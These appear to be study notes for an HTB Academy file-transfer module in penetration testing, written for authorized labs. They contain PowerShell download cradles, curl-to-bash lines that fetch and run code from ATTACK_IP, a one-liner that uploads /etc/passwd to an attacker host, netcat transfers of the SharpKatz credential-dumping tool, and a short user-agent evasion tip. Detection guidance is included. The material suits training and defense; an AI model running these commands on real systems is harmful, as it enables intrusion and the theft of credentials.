# HTB Academy: File Transfers

> Complete study notes for the File Transfers module. Commands are for authorized labs and assessments only. Replace example addresses, paths, users, and secrets with values from your approved scope.

## Module purpose

File transfer is a supporting skill used throughout enumeration, exploitation, incident response, and administration. The practical problem is always the same: identify what the source and destination systems support, choose an allowed transport, protect the data, verify integrity, and clean up.

## 1. File-transfer fundamentals

Before choosing a method, identify:

- Source and destination operating systems
- Transfer direction: attack host to target or target to attack host
- Available interpreters and binaries
- Reachable ports and egress restrictions
- Authentication requirements
- File size and whether the data is binary or text
- Confidentiality requirements
- Logging and detection implications

Prefer encrypted, authenticated transports such as SSH/SCP/SFTP or HTTPS. Treat transferred assessment data as sensitive and verify its hash after transfer.

---

## 2. Windows file-transfer methods

### PowerShell Base64 transfer

Base64 is useful when direct file transfer is unavailable and the file is small enough to fit command-line and clipboard limits. It is encoding, not encryption.

Linux encode:

```bash
base64 -w 0 file.bin > file.b64
```

PowerShell decode:

```powershell
[IO.File]::WriteAllBytes('C:\\Temp\\file.bin', [Convert]::FromBase64String('<BASE64>'))
```

PowerShell encode:

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Temp\\file.bin'))
```

Linux decode:

```bash
echo '<BASE64>' | base64 -d > file.bin
```

Windows `cmd.exe` has an approximately 8,191-character command-line limit. Large Base64 strings may be truncated, so use a real transport for larger files.

### PowerShell WebClient downloads

```powershell
(New-Object Net.WebClient).DownloadFile('http://ATTACK_IP:8000/tool.exe','C:\\Temp\\tool.exe')
(New-Object Net.WebClient).DownloadFileAsync('http://ATTACK_IP:8000/tool.exe','C:\\Temp\\tool.exe')
```

Download text into memory:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://ATTACK_IP:8000/script.ps1')
```

This avoids saving the script itself but is not invisible: network, PowerShell, AMSI, and process telemetry may still record it.

### PowerShell download cradles

A **download cradle** is a short command that retrieves remote content and immediately executes or loads it. It is convenient in a controlled lab, but it combines two high-risk operations: trusting remote content and executing it without a normal review step. Prefer downloading to a file, checking the source and hash, and executing separately.

WebClient:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://LAB_SERVER/script.ps1')
```

PowerShell 3.0 and later:

```powershell
IEX (Invoke-WebRequest 'http://LAB_SERVER/script.ps1' -UseBasicParsing).Content
```

Legacy Internet Explorer COM automation:

```powershell
$ie = New-Object -ComObject InternetExplorer.Application
$ie.Visible = $false
$ie.Navigate('http://LAB_SERVER/script.ps1')
Start-Sleep -Seconds 5
$r = $ie.Document.body.innerHTML
$ie.Quit()
IEX $r
```

MSXML COM object:

```powershell
$h = New-Object -ComObject Msxml2.XMLHTTP
$h.Open('GET','http://LAB_SERVER/script.ps1',$false)
$h.Send()
IEX $h.ResponseText
```

WinHTTP COM object:

```powershell
$h = New-Object -ComObject WinHttp.WinHttpRequest.5.1
$h.Open('GET','http://LAB_SERVER/script.ps1',$false)
$h.Send()
IEX $h.ResponseText
```

WinHTTP uses its own proxy configuration and may not automatically use the interactive user's browser proxy settings.

BITS transfer, which writes a temporary file to disk:

```powershell
Import-Module BitsTransfer
Start-BitsTransfer 'http://LAB_SERVER/script.ps1' "$env:TEMP\transfer.tmp"
$r = Get-Content "$env:TEMP\transfer.tmp" -Raw
Remove-Item "$env:TEMP\transfer.tmp"
IEX $r
```

DNS TXT-record transport:

```powershell
$txt = (Resolve-DnsName -Type TXT payload.lab.example).Strings -join ''
$code = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($txt))
IEX $code
```

The TXT record must contain the expected Base64 text. DNS size limits may require chunking, and DNS logs can reveal the queries. Base64 provides no confidentiality or authenticity.

XML-hosted command content:

```powershell
$xml = New-Object System.Xml.XmlDocument
$xml.Load('https://LAB_SERVER/command.xml')
$xml.command.a.execute | IEX
```

Treat every remote response as untrusted input. A changed server response, DNS record, proxy response, or XML document changes what is executed. In authorized exercises, pin the source, use TLS, validate content, and keep a copy for evidence.

### Invoke-WebRequest and Invoke-RestMethod

```powershell
Invoke-WebRequest 'http://ATTACK_IP:8000/file.bin' -OutFile 'C:\\Temp\\file.bin'
Invoke-RestMethod 'http://ATTACK_IP:8000/file.bin' -OutFile 'C:\\Temp\\file.bin'
```

Older PowerShell versions may need `-UseBasicParsing`. If HTTPS fails because the lab uses a self-signed certificate, install or trust the correct certificate when possible. Disabling validation should be limited to controlled labs and restored afterward.

### SMB download and upload

Create a temporary authenticated SMB share on the attack host:

```bash
sudo impacket-smbserver share /srv/share -smb2support -username labuser -password '<STRONG_PASSWORD>'
```

Connect from Windows:

```cmd
net use \\ATTACK_IP\share /user:labuser <STRONG_PASSWORD>
copy \\ATTACK_IP\share\tool.exe C:\Temp\tool.exe
copy C:\Temp\result.txt \\ATTACK_IP\share\result.txt
net use \\ATTACK_IP\share /delete
```

Modern Windows often blocks unauthenticated guest SMB access. Use credentials, SMB2 support, a dedicated share, and firewall rules limited to the lab network.

### WebDAV over HTTP/S

When outbound SMB is blocked, Windows can access WebDAV through the WebClient service.

Attack host:

```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/srv/share --auth=anonymous
```

Windows:

```cmd
dir \\ATTACK_IP\DavWWWRoot
copy C:\Temp\result.txt \\ATTACK_IP\DavWWWRoot\result.txt
```

`DavWWWRoot` tells the WebDAV redirector to access the server root. Use authentication and HTTPS outside a disposable lab.

### FTP download and upload

Start a controlled FTP server:

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21 --write
```

PowerShell download or upload:

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://ATTACK_IP/file.bin','C:\\Temp\\file.bin')
(New-Object Net.WebClient).UploadFile('ftp://ATTACK_IP/result.txt','C:\\Temp\\result.txt')
```

The legacy Windows FTP client can be automated with a command file and `ftp -s:commands.txt`. Standard FTP exposes credentials and content in plaintext; prefer SFTP or HTTPS.

### HTTP upload from PowerShell

Start an upload receiver on the attack host:

```bash
python3 -m pip install uploadserver
python3 -m uploadserver 8000
```

Upload from Windows:

```powershell
Invoke-FileUpload -Uri 'http://ATTACK_IP:8000/upload' -File 'C:\\Temp\\result.txt'
```

If the helper is unavailable, use `Invoke-WebRequest`, `Invoke-RestMethod`, or `WebClient.UploadFile` with the request format expected by the server.

### Base64 upload over HTTP

For small files, PowerShell can Base64-encode the data and POST it to a controlled receiver. The server must decode the request body. This remains plaintext unless HTTPS is used.

---

## 3. Linux file-transfer methods

### wget and curl

```bash
wget http://ATTACK_IP:8000/tool.sh -O /tmp/tool.sh
curl http://ATTACK_IP:8000/tool.sh -o /tmp/tool.sh
```

If disk writes are undesirable and the content has been reviewed, pipe trusted scripts directly to an interpreter:

```bash
curl -fsSL http://ATTACK_IP:8000/script.sh | bash
wget -qO- http://ATTACK_IP:8000/script.py | python3
```

Piping unreviewed remote content to a shell is dangerous. Save, inspect, and hash scripts whenever possible.

### Base64

```bash
base64 -w 0 file.bin
echo '<BASE64>' | base64 -d > file.bin
```

### Bash `/dev/tcp`

Some Bash builds expose TCP sockets as pseudo-paths:

```bash
exec 3<>/dev/tcp/ATTACK_IP/8000
printf 'GET /file.bin HTTP/1.0\r\nHost: ATTACK_IP\r\n\r\n' >&3
cat <&3 > response.bin
```

This is a fallback, not a full HTTP client. Headers must be removed before using the body.

### SCP/SFTP

```bash
scp ./tool.sh user@TARGET_IP:/tmp/tool.sh
scp user@TARGET_IP:/tmp/result.txt ./result.txt
sftp user@TARGET_IP
```

SCP and SFTP provide encryption and authentication but require SSH reachability and valid credentials.

### Temporary web servers

```bash
python3 -m http.server 8000
python2.7 -m SimpleHTTPServer 8000
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000
```

Bind only to the required interface where possible, serve a dedicated directory, and stop the server after use.

### HTTPS upload server

Generate a short-lived lab certificate and run the upload server with TLS:

```bash
openssl req -x509 -newkey rsa:2048 -nodes -keyout server.pem -out server.pem -days 1
python3 -m uploadserver 443 --server-certificate server.pem
```

The client should validate the certificate. A self-signed certificate encrypts traffic but does not establish trusted server identity unless the client explicitly trusts it.

---

## 4. Transferring files with code

Interpreters installed on a target can provide a transfer path when dedicated tools are absent.

### Python

```bash
python2.7 -c 'import urllib; urllib.urlretrieve("http://ATTACK_IP:8000/file", "file")'
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://ATTACK_IP:8000/file", "file")'
```

Upload to Python `uploadserver`:

```bash
python3 -c 'import requests; requests.post("http://ATTACK_IP:8000/upload", files={"files":open("/tmp/result.txt","rb")})'
```

### PHP

```bash
php -r '$d=file_get_contents("http://ATTACK_IP:8000/file"); file_put_contents("file",$d);'
```

Streaming with `fopen`, `fread`, and `fwrite` is preferable for larger files. PHP URL wrappers must be enabled. A trusted script can also be read with `file()` and piped to an interpreter, but this carries the same risks as `curl | bash`.

### Ruby and Perl

```bash
ruby -e 'require "net/http"; File.write("file", Net::HTTP.get(URI("http://ATTACK_IP:8000/file")))'
perl -e 'use LWP::Simple; getstore("http://ATTACK_IP:8000/file", "file");'
```

### Windows JavaScript and VBScript

Windows Script Host can run `.js` or `.vbs` downloaders through `cscript.exe`. Typical implementations use `WinHttp.WinHttpRequest` or `Microsoft.XMLHTTP` for the request and `ADODB.Stream` to save the binary response.

```cmd
cscript.exe /nologo wget.js http://ATTACK_IP:8000/file.bin C:\Temp\file.bin
cscript.exe /nologo wget.vbs http://ATTACK_IP:8000/file.bin C:\Temp\file.bin
```

These are strongly monitored in many environments; their availability does not imply authorization to use them.

### Hands-on workflow: code-based transfers

The Section 4 optional exercise asks the learner to connect to the Linux target over SSH and practice code-based downloads and uploads with the Pwnbox.

| Method | Direction | Runs on |
|---|---|---|
| Python, PHP, Ruby, or Perl download | Pwnbox → Linux target | Target |
| Python `requests.post()` upload | Linux target → Pwnbox | Target |
| Python `uploadserver` | Serves downloads and receives uploads | Pwnbox |

Prepare a harmless test file and start the receiving server on Pwnbox:

```bash
mkdir -p /tmp/code-transfer
cd /tmp/code-transfer
echo "HTB code transfer practice" > section4-test.txt
python3 -m uploadserver
```

The server exposes two relevant paths:

```text
Download: http://PWNBOX_IP:8000/section4-test.txt
Upload:   http://PWNBOX_IP:8000/upload
```

Connect to the lab target:

```bash
ssh htb-student@TARGET_IP
```

Download with Python 3:

```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://PWNBOX_IP:8000/section4-test.txt","python-test.txt")'
cat python-test.txt
```

- `python3 -c` runs the supplied Python code directly from the shell.
- `urllib.request` provides the standard-library HTTP client.
- `urlretrieve(source, destination)` downloads the first argument into the second.

Download with PHP:

```bash
php -r '$file=file_get_contents("http://PWNBOX_IP:8000/section4-test.txt");file_put_contents("php-test.txt",$file);'
cat php-test.txt
```

- `-r` runs PHP code directly from the command line.
- `file_get_contents()` retrieves the remote content.
- `file_put_contents()` saves that content locally.

Download with Ruby:

```bash
ruby -e 'require "net/http";File.write("ruby-test.txt",Net::HTTP.get(URI.parse("http://PWNBOX_IP:8000/section4-test.txt")))'
cat ruby-test.txt
```

Download with Perl:

```bash
perl -e 'use LWP::Simple;getstore("http://PWNBOX_IP:8000/section4-test.txt","perl-test.txt");'
cat perl-test.txt
```

Not every target has all four interpreters or the required libraries. A missing runtime or module is a reason to try another language rather than install unnecessary software on the target.

Upload a file from the target to Pwnbox using the exact Python pattern taught by HTB:

```bash
python3 -c 'import requests;requests.post("http://PWNBOX_IP:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

- `import requests` loads the third-party HTTP library.
- `requests.post()` sends an HTTP POST request.
- The URL ending in `/upload` selects `uploadserver`'s receiving endpoint.
- `open("/etc/passwd","rb")` opens the source in binary-read mode.
- `files={"files": ...}` sends it as a multipart file field named `files`.

Confirm the upload on Pwnbox:

```bash
ls -l /tmp/code-transfer/passwd
```

For the optional exercise, one successful code-based download and one successful Python upload demonstrate both directions. Additional languages should be tested when present.

---

## 5. Miscellaneous transfer methods

This section covers alternatives for situations where the more familiar HTTP, HTTPS, SMB, or SCP path is unavailable.

| Method | Typical use | Requirement |
|---|---|---|
| Netcat/Ncat | Simple byte-stream transfer in either direction | Reachable TCP port and `nc`/`ncat` on both systems |
| Bash `/dev/tcp` | Receive a stream when Netcat is absent | Bash compiled with `/dev/tcp` support |
| PowerShell Remoting | Windows-to-Windows transfer | WinRM, authorization, and appropriate privileges |
| RDP drive redirection | Interactive two-way transfer during an RDP session | RDP plus `xfreerdp`, `rdesktop`, or `mstsc.exe` |

### Netcat and Ncat fundamentals

Netcat reads from standard input and writes received network data to standard output. Shell redirection supplies or captures the file:

- `< file` reads a local file and feeds its bytes into Netcat.
- `> file` captures received bytes and writes them to a local file.
- `-l` selects listen mode.
- `-p PORT` selects the local listening port.
- Original Netcat's `-q 0` closes immediately after standard input reaches end-of-file.
- Ncat's `--send-only` closes after sending all input.
- Ncat's `--recv-only` receives data without waiting to send anything back.

The listener can run on either side. Start the listener first, then run the connecting command.

#### Method 1: target listens and Pwnbox sends

This copies `SharpKatz.exe` from the Pwnbox to the target.

Target using original Netcat:

```bash
nc -l -p 8000 > SharpKatz.exe
```

Pwnbox using original Netcat:

```bash
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
nc -q 0 TARGET_IP 8000 < SharpKatz.exe
```

Target using Ncat:

```bash
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

Pwnbox using Ncat:

```bash
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
ncat --send-only TARGET_IP 8000 < SharpKatz.exe
```

#### Method 2: Pwnbox listens and target connects

This arrangement is useful when a firewall blocks inbound connections to the target but permits the target to make an outbound connection.

Pwnbox using original Netcat:

```bash
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

Target using original Netcat:

```bash
nc PWNBOX_IP 443 > SharpKatz.exe
```

Pwnbox using Ncat:

```bash
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

Target using Ncat:

```bash
ncat PWNBOX_IP 443 --recv-only > SharpKatz.exe
```

Using TCP/443 does not make Netcat traffic HTTPS or encrypted. It is still a plaintext byte stream.

#### Bash `/dev/tcp` fallback

If the Linux target lacks Netcat and Ncat, Bash can open a TCP connection through its `/dev/tcp/HOST/PORT` pseudo-path.

First make the Pwnbox listen and send the file:

```bash
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

Or use Ncat:

```bash
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

Then receive it on the target:

```bash
cat < /dev/tcp/PWNBOX_IP/443 > SharpKatz.exe
```

The same patterns can be reversed to copy a file from the target to the Pwnbox: the system holding the source file uses `< SOURCE_FILE`, and the receiver uses `> DESTINATION_FILE`.

Plain Netcat provides no encryption, authentication, integrity protection, or filename metadata. Use it only in the authorized lab, close the listener after transfer, and compare file hashes.

### PowerShell Session file transfer

PowerShell Remoting, also called WinRM, can transfer files between Windows systems when HTTP, HTTPS, or SMB is unavailable. WinRM commonly listens on TCP/5985 for HTTP and TCP/5986 for HTTPS.

The account must have administrative rights, belong to **Remote Management Users**, or have explicit permission in the PowerShell session configuration.

Confirm that the WinRM HTTP port is reachable:

```powershell
Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

Create a session and save it in `$Session`:

```powershell
$Session = New-PSSession -ComputerName DATABASE01
```

Copy from the local Windows system to the remote session:

```powershell
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

Copy from the remote session to the local Windows system:

```powershell
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

Direction is controlled by the session parameter:

| Parameter | Direction |
|---|---|
| `-ToSession $Session` | Local Windows host → remote Windows host |
| `-FromSession $Session` | Remote Windows host → local Windows host |

### RDP file transfer

RDP supports ordinary copy and paste, but clipboard redirection may be disabled or unreliable. A more explicit method is to expose a Pwnbox directory as a drive inside the remote Windows session.

Mount a Linux folder with `rdesktop`:

```bash
rdesktop TARGET_IP -d DOMAIN -u USER -p 'PASSWORD' -r disk:linux='/home/user/rdesktop/files'
```

Mount a Linux folder with `xfreerdp`:

```bash
xfreerdp /v:TARGET_IP /d:DOMAIN /u:USER /p:'PASSWORD' /drive:linux,/home/user/filetransfer
```

| Option | Meaning |
|---|---|
| `/v:TARGET_IP` | Remote Windows host |
| `/d:DOMAIN` or `-d DOMAIN` | Windows domain; omit it when the lab gives no domain |
| `/u:USER` or `-u USER` | RDP username |
| `/p:'PASSWORD'` or `-p 'PASSWORD'` | RDP password |
| `/drive:linux,PATH` | Share `PATH` under the name `linux` with `xfreerdp` |
| `-r disk:linux=PATH` | Share `PATH` under the name `linux` with `rdesktop` |

Inside Windows, open File Explorer and enter:

```text
\\tsclient\linux
```

Files copied into this location appear in the mapped Pwnbox directory. Files already in the Pwnbox directory can be copied from this location into Windows. The redirected drive is scoped to the RDP session and may be blocked by system policy. Windows Defender can also inspect files exposed through the shared directory.

### Hands-on workflow: optional RDP exercise

The Section 5 exercise asks the learner to connect to the Windows target with `htb-student`, mount a Linux directory, and verify transfers in both directions.

Prepare a harmless file on the Pwnbox:

```bash
mkdir -p "$HOME/filetransfer"
echo "File created on the Pwnbox" > "$HOME/filetransfer/pwnbox-test.txt"
ls -l "$HOME/filetransfer"
```

After spawning the lab target, connect with the credentials supplied by HTB:

```bash
xfreerdp /v:TARGET_IP /u:htb-student /p:'HTB_@cademy_stdnt!' /drive:linux,$HOME/filetransfer
```

The `rdesktop` alternative is:

```bash
rdesktop TARGET_IP -u htb-student -p 'HTB_@cademy_stdnt!' -r disk:linux="$HOME/filetransfer"
```

Inside the Windows session:

1. Open File Explorer and browse to `\\tsclient\linux`.
2. Confirm that `pwnbox-test.txt` is visible.
3. Copy `pwnbox-test.txt` to the Windows Desktop to test Pwnbox → target.
4. Create a harmless text file on the Windows Desktop.
5. Copy that Windows file into `\\tsclient\linux` to test target → Pwnbox.

Back on the Pwnbox, verify that the Windows file arrived:

```bash
ls -l "$HOME/filetransfer"
cat "$HOME/filetransfer/WINDOWS_FILE_NAME"
```

After both directions work, the exercise answer is `DONE`.

---

## 6. Protected file transfers

Assessment artifacts can contain credentials, account lists, directory data, and network details. Minimize collection, avoid transferring real PII or financial data unless the client explicitly requires it, and use synthetic data to test DLP controls.

### Windows AES helper

After reviewing and importing an approved AES helper script:

```powershell
Import-Module .\\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key '<UNIQUE_STRONG_SECRET>' -Path .\\results.txt
Invoke-AESEncryption -Mode Decrypt -Key '<UNIQUE_STRONG_SECRET>' -Path .\\results.txt.aes
```

Use a unique secret per engagement and transfer it through a separate approved channel. Prefer modern authenticated encryption where available; encryption without authentication may not detect tampering.

### Linux OpenSSL encryption

```bash
openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 -in results.txt -out results.enc
openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -in results.enc -out results.txt
```

Encryption at rest complements rather than replaces an encrypted transport.

---

## 7. Catching files over HTTP/S

Nginx can provide a narrow upload endpoint using HTTP `PUT`.

```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

Example `/etc/nginx/sites-available/upload.conf`:

```nginx
server {
    listen 9001;

    location /SecretUploadDirectory/ {
        root /var/www/uploads;
        dav_methods PUT;
    }
}
```

Enable and restart:

```bash
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/upload.conf
sudo nginx -t
sudo systemctl restart nginx
```

Upload:

```bash
curl -T ./result.txt http://SERVER_IP:9001/SecretUploadDirectory/result.txt
```

Hardening requirements:

- Use a dedicated directory and least-privileged ownership
- Disable script execution and directory listing
- Require authentication and HTTPS outside an isolated lab
- Restrict source addresses and file size
- Prevent overwrite if evidence preservation matters
- Monitor `/var/log/nginx/error.log` and access logs
- Check for port conflicts with `ss -lntp`
- Remove the configuration and uploaded data when finished

---

## 8. Living off the land

LOLBAS catalogs Windows binaries and GTFOBins catalogs Unix-like binaries whose legitimate functionality can be used in unexpected ways. Relevant categories include file download, upload, read, write, and command execution.

Examples covered by the module:

- `certreq.exe -Post` can send a file in an HTTP request on compatible Windows versions.
- OpenSSL can transfer a byte stream between `s_server` and `s_client`.
- BITS can download files through `bitsadmin` or `Start-BitsTransfer`.
- `certutil.exe` can retrieve a URL, although this behavior is heavily monitored.

```powershell
Start-BitsTransfer -Source 'http://ATTACK_IP:8000/file.bin' -Destination 'C:\\Temp\\file.bin'
```

```cmd
certutil.exe -verifyctl -split -f http://ATTACK_IP:8000/file.bin C:\Temp\file.bin
```

OpenSSL stream example:

```bash
# sender
openssl s_server -quiet -accept 9001 -cert certificate.pem -key key.pem < file.bin

# receiver
openssl s_client -connect SENDER_IP:9001 -quiet > file.bin
```

The presence of a signed or built-in binary does not make an action benign. Use only within scope and expect endpoint and network telemetry.

---

## 9. Detection

Command-line blacklists are fragile because casing, aliases, alternate syntax, and equivalent tools can change the string without changing the behavior. A behavior-based allowlist and well-tuned anomaly detection are stronger.

HTTP clients expose characteristic request patterns and user-agent strings:

| Technique | Common network indicator |
|---|---|
| PowerShell WebClient / Invoke-WebRequest | `WindowsPowerShell/<version>` or .NET HTTP behavior |
| WinHTTP COM | `WinHttp.WinHttpRequest` user agent |
| MSXML COM | Legacy Internet Explorer/Trident-like user agent |
| Certutil | `Microsoft-CryptoAPI/<version>` |
| BITS | `Microsoft BITS/<version>` and an initial `HEAD` request |

Download-cradle detection should also look for `Invoke-Expression`/`IEX` receiving network-derived data, PowerShell creating browser or HTTP COM objects, BITS jobs followed by reads and deletion, unusual DNS TXT lookups, and XML documents whose values flow into execution.

Defenders should correlate:

- Process creation and full command lines
- Parent/child process relationships
- PowerShell Script Block and module logging
- AMSI and endpoint detections
- DNS, proxy, firewall, and web-server logs
- Unusual destinations, ports, file types, and transfer volume
- File creation followed by execution
- Rare tools or first-seen user agents for a host or identity

Allowlisting known updater and browser traffic helps reduce noise, but user-agent values are attacker-controlled and should never be the only signal.

---

## 10. Evasive-testing considerations

PowerShell permits changing the user agent used by `Invoke-WebRequest`:

```powershell
$ua = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest 'http://ATTACK_IP:8000/file.bin' -UserAgent $ua -OutFile 'C:\\Temp\\file.bin'
```

Changing a header may bypass a naive string rule, but it does not remove process, script, network, file, and behavioral evidence. Likewise, using a less common LOLBin may bypass a simple application rule while remaining detectable through behavior.

Evasion must be explicitly authorized in the rules of engagement. The purpose is to measure controls, not to hide unapproved activity. Coordinate with stakeholders, avoid destructive techniques, and preserve a complete tester activity log.

---

## Integrity, evidence, and cleanup

### Verify the transfer

```bash
sha256sum file.bin
```

```powershell
Get-FileHash .\\file.bin -Algorithm SHA256
```

The hashes must match. A successful command or expected file size is not enough to prove integrity.

### Record evidence

Capture:

- Source and destination
- Direction and transport
- Timestamp and operator
- Relevant command or configuration
- File name, size, and SHA-256
- Encryption and authentication used
- Any errors and the remediation
- Cleanup completed

### Clean up

- Stop temporary HTTP, FTP, SMB, WebDAV, Netcat, Nginx, and OpenSSL listeners
- Remove shares, mapped drives, sessions, temporary certificates, accounts, and firewall exceptions
- Delete test files from both ends according to the engagement plan
- Restore any relaxed certificate or security settings
- Preserve required evidence in the approved location

## Method-selection summary

| Situation | Preferred method | Fallback |
|---|---|---|
| SSH available | SCP/SFTP | HTTPS |
| Windows with outbound HTTP/S | HTTPS + PowerShell/BITS | WebDAV |
| Windows with SMB allowed | Authenticated SMB2/3 | HTTPS |
| Linux with HTTP/S | curl/wget | language one-liner |
| Small text/binary and no channel | Base64 | Netcat in an isolated lab |
| Sensitive assessment data | Encrypted transport plus encrypted artifact | Do not transfer until a safe path exists |

## Related notes

- [Unified file-transfer knowledge](../../../knowledge-base/exploitation/file-transfer.md)
- [File-transfer cheatsheet](../../../cheatsheets/file-transfer.md)
- [Complete-path File Transfers summary](complete-path-study-pack/knowledge-base/07-file-transfers.md)

